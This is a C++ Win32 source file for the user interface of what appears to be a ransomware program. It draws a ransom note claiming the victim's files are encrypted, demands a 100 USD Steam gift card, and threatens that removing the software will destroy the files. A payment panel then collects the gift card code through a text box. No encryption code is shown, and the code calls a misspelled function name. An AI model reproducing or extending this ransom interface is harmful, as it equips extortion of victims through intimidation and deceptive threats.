
#include <Windows.h>
#include <tchar.h>
#include <iostream>
#include "panels.h"
#include "core.h"
void GetDesktopResolition(int& horizontal, int& vertical)
{
    RECT desktop;
    
    const HWND hDesktop = GetDesktopWindow();
   
    GetWindowRect(hDesktop, &desktop);
   
    horizontal = desktop.right;
    vertical = desktop.bottom;
}


void loadCodeImg();
HBITMAP hCodeImage;
HWND hCodeImg,hCode;
LRESULT CALLBACK InfoPanel(HWND hInfoPanel , UINT msg, WPARAM wp, LPARAM lp)
{
    const wchar_t * infoText = L"Your computer and all important files has been encrypted including:\n\
photos,videos,documents,etc.\n\
Encryption was produced using a secret key, generated for this computer,\n\
stored on a secret server on the internet.\n\
A single copy of key is stored on server and this will be destroyed after a time.\n\
After nobody and never will be able to decrypto your computer.\n\
\n\
To obtain access to your key, you need to send a 100 USD Steam gift card.\n\
\n\
Click <<Next>> to make payment.\n\
\n\
!!!WARNING!!!\n\
Any attempt to remove or damage this software will lead to the immediate \n\
destruction of your files.\n\
";
    HFONT hFont;
    HWND hText;
    int v = 0;
    int h = 0;
    GetDesktopResolution(h, v);

    switch (msg)
    {
    case WM_CREATE:
        hText = CreateWindowW(L"Static", infoText, WS_CHILD | WS_VISIBLE, 0.06 * h, 0.1 * v, h, 0.5 * v, hInfoPanel, NULL, NULL, NULL);
        hFont = CreateFont(0.027 * v, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
        SendMessage(hText, WM_SETFONT, WPARAM(hFont), TRUE);
        break;

    case WM_CLOSE:

        DestroyWindow(hInfoPanel);
        break;
    default:
        return DefWindowProcW(hInfoPanel, msg, wp, lp);

    }


}

void InfoPanelClass(HINSTANCE hInst)
{
    WNDCLASSW panel = { 0 };

    panel.hbrBackground = (HBRUSH)COLOR_WINDOW;
    panel.hCursor = LoadCursor(NULL, MAKEINTRESOURCE(32663));
    panel.hInstance = hInst;
    panel.lpszClassName = L"infoPanel";
    panel.lpfnWndProc = InfoPanel;


    RegisterClassW(&panel);



}

LRESULT CALLBACK PayPanel(HWND hPayPanel, UINT msg, WPARAM wp, LPARAM lp)
{

    HFONT hFont,hCFont,hEFont;
    HWND hText, hChoose, hEnter;
   
    static HWND hChooseOpt;
    int v = 0;
    int h = 0;
    GetDesktopResolution(h, v);
    static HBITMAP bmpsrc = NULL;
    const wchar_t* chooseText[] = { L"100 USD" };
    
    const wchar_t* infoText = L"Steam gift cards are virtual card, this can be used to add money to the Steam wallet.\n\
\n\
Where can I purchase a Steam wallet code? \n\
You can buy them in thousands of retail stores or online shops using your local\n\
payment methods.";

    switch (msg)
    {

    case WM_CREATE:
    {

        hText = CreateWindowW(L"Static", infoText, WS_CHILD | WS_VISIBLE, 0.03 * h, 0.22 * v, h, 0.5 * v, hPayPanel, NULL, NULL, NULL);
        hFont = CreateFont(0.027 * v, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
        SendMessage(hText, WM_SETFONT, WPARAM(hFont), TRUE);
        loadCodeImg();
        hCodeImg = CreateWindowW(L"Static", NULL, WS_VISIBLE | WS_CHILD | SS_BITMAP, 0.22 * h, 0.04 * v, 0.08 * h, 0.16 * v, hPayPanel, NULL, NULL, NULL);
        SendMessageW(hCodeImg, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hCodeImage);


        hChoose = CreateWindowW(L"Static", L"Choose the amount of payment:", WS_CHILD | WS_VISIBLE, 0.19 * h, 0.375 * v, h, 0.5 * v, hPayPanel, NULL, NULL, NULL);
        hCFont = CreateFont(0.020 * v, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
        SendMessage(hChoose, WM_SETFONT, WPARAM(hCFont), TRUE);

        hChooseOpt = CreateWindowW(L"Combobox", L"",
            WS_CHILD | WS_VISIBLE | CBS_DROPDOWN | CBS_HASSTRINGS|CB_LIMITTEXT,
            0.237*h, 0.41*v, 120, 110, hPayPanel, NULL, NULL, NULL);

        hEnter = CreateWindowW(L"Static", L"Enter the Steam wallet code:", WS_CHILD | WS_VISIBLE, 0.196 * h, 0.475 * v, h, 0.5 * v, hPayPanel, NULL, NULL, NULL);
        hEFont = CreateFont(0.020 * v, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
        SendMessage(hEnter, WM_SETFONT, WPARAM(hEFont), TRUE);

        hCode = CreateWindowW(L"Edit", L"", WS_VISIBLE | WS_CHILD  | WS_BORDER, 0.185 * h, 0.5*v, 400, 30, hPayPanel,
            NULL, NULL, NULL);

        hEnter = CreateWindowW(L"Static", L"*Make sure that you enter the payment informations correctly and click <<PAY>>:", WS_CHILD | WS_VISIBLE, 0.1 * h, 0.6 * v, h, 0.5 * v, hPayPanel, NULL, NULL, NULL);
        hEFont = CreateFont(0.020 * v, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
        SendMessage(hEnter, WM_SETFONT, WPARAM(hEFont), TRUE);

        for (int i = 0; i < 1; i++) {
            SendMessageW(hChooseOpt, (UINT)CB_ADDSTRING, (WPARAM)0, (LPARAM)chooseText[i]);
        }
       
    }
        break;

    case WM_SHOWWINDOW:
        SendMessage(hChooseOpt, CB_SETCURSEL, (WPARAM)0, (LPARAM)0);
        break;


    case WM_CLOSE:

        DestroyWindow(hPayPanel);
        break;
    default:
        return DefWindowProcW(hPayPanel, msg, wp, lp);

    }


}


void PayPanelClass(HINSTANCE hInst)
{
    WNDCLASSW panel = { 0 };

    panel.hbrBackground = (HBRUSH)COLOR_WINDOW;
    panel.hCursor = LoadCursor(NULL, MAKEINTRESOURCE(32663));
    panel.hInstance = hInst;
    panel.lpszClassName = L"payPanel";
    panel.lpfnWndProc = PayPanel;


    RegisterClassW(&panel);

}
void loadCodeImg()
{
    int v = 0;
    int h = 0;
    GetDesktopResolution(h, v);

    hCodeImage = (HBITMAP)LoadImageW(NULL, L"card.bmp", IMAGE_BITMAP, 0.08*h, 0.16*v, LR_LOADFROMFILE);
}

std::string getCode()
{
    char code[100];
    GetWindowText(hCode, code, 100);
    std::string strCode = code;
    return strCode;
}